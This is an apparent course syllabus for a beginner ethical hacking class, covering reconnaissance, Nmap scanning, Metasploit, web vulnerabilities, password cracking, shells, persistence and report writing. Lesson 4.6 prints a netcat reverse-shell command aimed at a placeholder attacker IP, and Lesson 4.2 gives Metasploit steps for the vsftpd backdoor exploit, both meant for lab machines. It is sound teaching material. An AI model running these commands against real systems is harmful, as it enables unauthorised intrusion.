# Course Template: Introduction to Ethical Hacking

**Course Information**
- **Title:** Introduction to Ethical Hacking
- **Difficulty:** Beginner
- **Category:** Web Application Security
- **Learning Path:** 🔴 Offensive Security
- **Estimated Duration:** 8-10 hours
- **Price:** Free (or $49 for certificate)
- **Prerequisites:** Basic computer knowledge, familiarity with command line

---

## Course Description

Master the fundamentals of ethical hacking and penetration testing. Learn the methodologies, tools, and techniques used by security professionals to identify and exploit vulnerabilities in systems while staying within legal and ethical boundaries.

This beginner-friendly course covers reconnaissance, scanning, enumeration, exploitation basics, and post-exploitation. Perfect for aspiring penetration testers, security analysts, and anyone interested in offensive security.

---

## Learning Objectives

By the end of this course, you will be able to:
- Understand the legal and ethical framework of penetration testing
- Conduct reconnaissance using OSINT techniques
- Perform network scanning and service enumeration
- Identify common vulnerabilities in systems and applications
- Use basic exploitation tools and techniques
- Document findings in a professional penetration test report
- Understand post-exploitation and maintaining access concepts

---

## Skills Covered

- Reconnaissance & OSINT (Beginner → Intermediate)
- Port Scanning & Enumeration (Beginner → Intermediate)
- Vulnerability Assessment (Beginner)
- Basic Exploitation (Beginner)
- Report Writing (Beginner)

---

## Course Structure

### Chapter 1: Introduction to Cybersecurity & Ethical Hacking

**Duration:** 1 hour | **Lessons:** 5 | **Quiz:** Yes

#### Lesson 1.1: What is Ethical Hacking? (10 min)
- Definition of ethical hacking vs. malicious hacking
- The role of penetration testers in cybersecurity
- Real-world examples of ethical hacking impact
- Career paths in offensive security

**Video Topics:**
- Introduction to the course
- White hat, black hat, and gray hat hackers
- Bug bounty programs overview
- Day in the life of a penetration tester

#### Lesson 1.2: Types of Hackers (8 min)
- White Hat Hackers (Ethical Hackers)
- Black Hat Hackers (Malicious Actors)
- Gray Hat Hackers
- Script Kiddies vs. Advanced Persistent Threats (APTs)
- Hacktivists and Nation-State Actors

#### Lesson 1.3: Legal and Ethical Considerations (12 min)
- Computer Fraud and Abuse Act (CFAA)
- Authorized testing vs. unauthorized access
- Rules of engagement in penetration testing
- Non-disclosure agreements (NDAs)
- Ethical boundaries and responsible disclosure

**Video Topics:**
- Legal case studies (what NOT to do)
- Getting authorization before testing
- Scope definition in penetration tests
- Bug bounty program rules

#### Lesson 1.4: Penetration Testing Methodology (15 min)
- The 5 phases of penetration testing:
  1. Reconnaissance
  2. Scanning & Enumeration
  3. Gaining Access (Exploitation)
  4. Maintaining Access
  5. Covering Tracks
- OWASP Testing Guide overview
- PTES (Penetration Testing Execution Standard)
- Report writing fundamentals

#### Lesson 1.5: Setting Up Your Lab Environment (15 min)
- Virtual machine basics (VirtualBox/VMware)
- Installing Kali Linux
- Setting up vulnerable machines (Metasploitable, DVWA)
- Lab safety and isolation
- Snapshot and backup best practices

**Hands-on Exercise:**
- Download and install VirtualBox
- Download Kali Linux VM
- Verify installation and basic commands

**Chapter 1 Quiz:** (10 questions, 70% passing)
1. What distinguishes a white hat hacker from a black hat hacker?
2. Which law in the US governs unauthorized access to computer systems?
3. What is the first phase of penetration testing?
4. True/False: It's acceptable to test a website if you discover a vulnerability.
5. What does OWASP stand for?
6. [More questions...]

---

### Chapter 2: Reconnaissance Fundamentals

**Duration:** 1.5 hours | **Lessons:** 6 | **Quiz:** Yes

#### Lesson 2.1: Introduction to Reconnaissance (10 min)
- Active vs. Passive reconnaissance
- The reconnaissance kill chain
- Why reconnaissance is crucial (80% of pentesting time)
- Legal considerations in information gathering

#### Lesson 2.2: Passive Reconnaissance Techniques (20 min)
- Google Dorking (Google Hacking Database)
- WHOIS lookups
- DNS enumeration (nslookup, dig, host)
- Subdomain discovery
- Email harvesting with theHarvester
- Social media reconnaissance (OSINT)

**Demo Tools:**
- Google advanced search operators
- WHOIS tools (whois command)
- dnsdumpster.com
- theHarvester
- Shodan.io basics

#### Lesson 2.3: OSINT Tools and Techniques (25 min)
- Maltego for relationship mapping
- Recon-ng framework
- SpiderFoot automation
- Finding leaked credentials (haveibeenpwned)
- GitHub reconnaissance
- LinkedIn and corporate structure mapping

**Hands-on Lab:**
- Use Maltego to map organization infrastructure
- Run theHarvester against test domain
- Explore Shodan for exposed devices

#### Lesson 2.4: Active Reconnaissance (15 min)
- Ping sweeps and host discovery
- Traceroute analysis
- Banner grabbing
- Social engineering basics
- Physical reconnaissance

**Warning:** Legal boundaries of active reconnaissance

#### Lesson 2.5: Web Application Reconnaissance (20 min)
- robots.txt and sitemap.xml analysis
- Technology fingerprinting (Wappalyzer, BuiltWith)
- WAF detection
- Certificate transparency logs
- Archive.org Wayback Machine
- Hidden directories and files

**Demo Tools:**
- Burp Suite proxy basics
- Nikto web scanner
- whatweb
- wafw00f

#### Lesson 2.6: Documentation and Note-Taking (10 min)
- Importance of documentation
- Note-taking tools (CherryTree, Obsidian, OneNote)
- Screenshot best practices
- Creating a reconnaissance report
- Organizing findings

**Chapter 2 Quiz:** (15 questions, 70% passing)

---

### Chapter 3: Scanning and Enumeration

**Duration:** 2 hours | **Lessons:** 7 | **Quiz:** Yes

#### Lesson 3.1: Introduction to Network Scanning (12 min)
- OSI model review (focus on layers 3-7)
- TCP/IP fundamentals
- TCP three-way handshake
- UDP characteristics
- Common ports and services (21, 22, 23, 25, 80, 443, 3389)

#### Lesson 3.2: Port Scanning with Nmap (25 min)
- Installing and using Nmap
- Nmap scan types:
  - TCP SYN scan (-sS)
  - TCP Connect scan (-sT)
  - UDP scan (-sU)
  - Service version detection (-sV)
  - OS detection (-O)
- Nmap timing options
- Output formats (-oN, -oX, -oG)
- Stealth scanning techniques

**Hands-on Lab:**
- Scan Metasploitable VM with various Nmap options
- Identify open ports and running services
- Save scan results

**Example Commands:**
```bash
nmap -sS -p- 192.168.1.100
nmap -sV -O 192.168.1.100
nmap -A -T4 192.168.1.0/24
```

#### Lesson 3.3: Service Enumeration (20 min)
- Banner grabbing with netcat
- Enumerating FTP (port 21)
- Enumerating SSH (port 22)
- Enumerating HTTP/HTTPS (ports 80/443)
- Enumerating SMB (ports 139/445)
- Enumerating databases (3306, 5432, 1433)

**Tools:**
- netcat (nc)
- telnet
- nmap NSE scripts
- enum4linux
- smbclient

#### Lesson 3.4: Vulnerability Scanning (20 min)
- Difference between scanning and exploitation
- Nessus basics (if available)
- OpenVAS introduction
- Nmap vulnerability scripts (--script vuln)
- False positives and validation
- CVE database and CVSS scoring

**Demo:**
- Run vulnerability scan on test target
- Interpret scan results
- Prioritize findings by severity

#### Lesson 3.5: Web Application Scanning (18 min)
- Directory brute-forcing (dirb, gobuster, ffuf)
- Finding hidden files and directories
- Identifying admin panels
- Backup file discovery (.bak, .old, ~)
- Source code analysis
- API endpoint discovery

**Tools Demo:**
- dirb
- gobuster
- ffuf (Fast web fuzzer)
- wfuzz

#### Lesson 3.6: Wireless Network Scanning (15 min)
- 802.11 wireless standards
- WiFi security protocols (WEP, WPA, WPA2, WPA3)
- Aircrack-ng suite overview
- Monitoring mode
- Finding hidden SSIDs
- Client identification
- **Ethics:** Only scan networks you own or have permission

#### Lesson 3.7: Interpreting Scan Results (10 min)
- Reading Nmap output
- Identifying attack surface
- Prioritizing targets
- Creating an enumeration report
- Mapping out the network
- Identifying low-hanging fruit

**Chapter 3 Quiz:** (20 questions, 70% passing)

---

### Chapter 4: Introduction to Exploitation

**Duration:** 2.5 hours | **Lessons:** 8 | **Quiz:** Yes

#### Lesson 4.1: Understanding Vulnerabilities (15 min)
- What is a vulnerability?
- Common vulnerability types:
  - Buffer overflows
  - SQL injection
  - Cross-Site Scripting (XSS)
  - Remote Code Execution (RCE)
  - Authentication bypass
- OWASP Top 10
- CVE and NVD databases
- Exploit-DB

#### Lesson 4.2: Introduction to Metasploit Framework (25 min)
- What is Metasploit?
- Metasploit architecture (modules, exploits, payloads)
- msfconsole basics
- Searching for exploits (search, searchsploit)
- Exploit modules vs. auxiliary modules
- Understanding payloads (reverse shell, bind shell, meterpreter)

**Demo:**
```bash
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS 192.168.1.100
exploit
```

#### Lesson 4.3: Basic Exploitation Techniques (30 min)
- Using Metasploit to exploit common vulnerabilities
- Exploiting unpatched services
- Default credentials exploitation
- Weak password attacks
- Using public exploits safely
- Verifying exploits before use

**Hands-on Lab:**
- Exploit vulnerable FTP service on Metasploitable
- Gain shell access
- Identify user privileges
- List files and directories

#### Lesson 4.4: Web Application Vulnerabilities (25 min)
- SQL Injection basics
- Testing for SQL injection (manual and automated)
- Using SQLmap
- Cross-Site Scripting (XSS) introduction
- Stored vs. Reflected XSS
- Command injection
- File inclusion vulnerabilities (LFI/RFI)

**Demo:**
- SQL injection on DVWA (low security)
- XSS payload examples
- Command injection demonstration

#### Lesson 4.5: Password Attacks (20 min)
- Hash cracking fundamentals
- John the Ripper basics
- Hashcat introduction
- Dictionary attacks vs. brute force
- Rainbow tables
- Password spraying
- Credential stuffing (ethics discussion)

**Tools:**
- John the Ripper
- Hashcat
- Hydra (for network service attacks)
- CrackStation online

#### Lesson 4.6: Shells and Reverse Shells (20 min)
- Types of shells (bind shell, reverse shell)
- Netcat listeners
- Generating payloads with msfvenom
- Upgrading shells to fully interactive
- Python TTY shell trick
- Catching shells with Metasploit multi/handler

**Practical Examples:**
```bash
# On attacker machine
nc -lvnp 4444

# On victim (if you have code execution)
nc -e /bin/sh ATTACKER_IP 4444
```

#### Lesson 4.7: Post-Exploitation Basics (15 min)
- Information gathering after compromise
- User enumeration
- Checking sudo privileges
- Finding sensitive files
- Searching for credentials
- Lateral movement concepts
- Pivoting introduction

**Commands:**
```bash
whoami
id
sudo -l
cat /etc/passwd
find / -name "*.txt" 2>/dev/null
```

#### Lesson 4.8: Responsible Exploitation (10 min)
- Testing in safe environments only
- Verifying scope before exploiting
- Documenting every action
- Taking screenshots as evidence
- Not causing damage or data loss
- Reporting findings responsibly
- Coordinated disclosure

**Chapter 4 Quiz:** (25 questions, 75% passing)

---

### Chapter 5: Post-Exploitation and Reporting

**Duration:** 1.5 hours | **Lessons:** 5 | **Quiz:** Yes

#### Lesson 5.1: Privilege Escalation Introduction (20 min)
- Why privilege escalation matters
- Linux privilege escalation basics
- Finding SUID binaries
- Kernel exploits
- Windows privilege escalation overview
- UAC bypass concepts
- Common misconfigurations

**Tools:**
- LinPEAS (Linux)
- WinPEAS (Windows)
- GTFOBins

#### Lesson 5.2: Maintaining Access (15 min)
- Creating backdoors (ethical considerations)
- SSH key persistence
- Cron job backdoors
- Web shells
- **Important:** Only in authorized penetration tests
- Cleanup after testing

#### Lesson 5.3: Covering Tracks (12 min)
- Log deletion (not recommended in real pentests)
- Understanding /var/log/
- Timestomping
- Why pentesters should NOT cover tracks
- Difference between pentesting and real attacks

**Ethical Note:** In legitimate penetration testing, you should document all actions, not hide them.

#### Lesson 5.4: Penetration Testing Report Writing (30 min)
- Executive summary
- Technical findings
- Vulnerability severity ratings (Critical, High, Medium, Low)
- Proof of concept (PoC)
- Remediation recommendations
- Screenshots and evidence
- Appendices

**Template Sections:**
1. Executive Summary (for management)
2. Methodology
3. Scope and Limitations
4. Detailed Findings (each vulnerability)
5. Recommendations
6. Conclusion

#### Lesson 5.5: Course Wrap-Up and Next Steps (13 min)
- Recap of key concepts
- Penetration testing certifications (OSCP, CEH, eJPT)
- Recommended practice platforms:
  - HackTheBox
  - TryHackMe
  - PentesterLab
  - VulnHub
- Building a home lab
- Joining cybersecurity communities
- Bug bounty programs for beginners
- Continuing education resources

**Final Course Project:**
- Complete full penetration test on provided VM
- Document all findings
- Write professional penetration test report
- Submit for review

**Chapter 5 Quiz:** (15 questions, 70% passing)

---

## Final Assessment

**Comprehensive Final Exam**
- 50 multiple-choice questions
- 80% passing score
- Covers all 5 chapters
- 90 minutes time limit
- 3 attempts allowed
- Certificate awarded upon passing

---

## Bonus Materials

### Downloadable Resources
- Penetration Testing Report Template
- Cheat Sheets:
  - Nmap Command Reference
  - Metasploit Quick Guide
  - Common Ports Reference
  - SQL Injection Payloads
  - XSS Payload Examples
- Vulnerable VM Setup Guides
- Practice Lab Instructions

### Additional Videos
- Interview with Professional Penetration Tester
- Bug Bounty Success Stories
- Advanced Nmap Techniques
- Capture The Flag (CTF) Walkthrough

---

## Course Outcomes

After completing this course, students will:
- Have a solid foundation in ethical hacking principles
- Understand the penetration testing methodology
- Be able to conduct reconnaissance and enumeration
- Know how to use essential tools (Nmap, Metasploit, Burp Suite)
- Identify and exploit common vulnerabilities
- Write professional security reports
- Be prepared for intermediate offensive security courses

---

## Recommended Next Courses

- Web Application Penetration Testing (Intermediate)
- Network Penetration Testing (Intermediate)
- Wireless Security Assessment (Intermediate)
- Linux Privilege Escalation (Intermediate)
- Bug Bounty Hunting (Intermediate)

---

## Instructor Notes

**Recording Tips:**
- Use high-quality screen recording (1920x1080 minimum)
- Clear audio with minimal background noise
- Show commands before executing them
- Explain every step clearly
- Use visual diagrams for complex concepts
- Pause after important points
- Provide real-world examples
- Encourage questions and engagement

**Lab Setup:**
- Ensure all VMs are functional before recording
- Test exploits before demonstrating
- Have backup plans if exploits fail
- Emphasize safety and legal boundaries
- Remind students this is for authorized testing only

**Legal Disclaimers:**
Include at the beginning of each video:
"This content is for authorized penetration testing and educational purposes only. Unauthorized access to computer systems is illegal and can result in criminal charges. Always obtain written permission before testing any system you do not own."

---

**Course Version:** 1.0
**Last Updated:** January 2026
**Estimated Video Content:** 8-10 hours
**Estimated Practice Labs:** 3-5 hours
**Total Course Time:** 12-15 hours
